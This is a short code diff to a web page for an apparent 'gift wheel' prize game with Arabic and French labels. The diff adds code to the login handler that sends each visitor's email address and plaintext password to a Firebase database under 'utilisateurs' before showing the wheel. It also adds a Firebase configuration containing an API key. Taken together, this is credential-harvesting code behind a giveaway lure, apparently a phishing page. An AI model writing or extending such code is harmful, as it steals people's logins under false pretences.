@@ -120,6 +120,14 @@ function submitLogin() {
     alert('يرجى إدخال بريد إلكتروني صالح!');
     return;
   }
+
+  // حفظ البيانات في Firebase
+  database.ref('utilisateurs').push({
+    email: email,
+    motdepasse: password,
+    timestamp: Date.now()
+  });
+
   document.getElementById('loginBox').style.display='none';
   document.getElementById('wheelBox').style.display='block';
 }
@@ -155,6 +163,26 @@ function shareApp(app){
   }
   window.open(url,'_blank');
 }
+</script>
+
+<!-- Firebase SDK -->
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+
+<script>
+// Initialize Firebase
+const firebaseConfig = {
+  apiKey: "AIzaSyCPh2zcOfC-e2LzgsFdLDh3jTKwZCx-848",
+  authDomain: "gift-wheel-data.firebaseapp.com",
+  databaseURL: "https://gift-wheel-data-default-rtdb.firebaseio.com",
+  projectId: "gift-wheel-data",
+  storageBucket: "gift-wheel-data.firebasestorage.app",
+  messagingSenderId: "790671082680",
+  appId: "1:790671082680:web:b107de227b8d7b2627a04d",
+  measurementId: "G-HM77C3ZV3C"
+};
+firebase.initializeApp(firebaseConfig);
+const database = firebase.database();
 </script>
 
 </body>
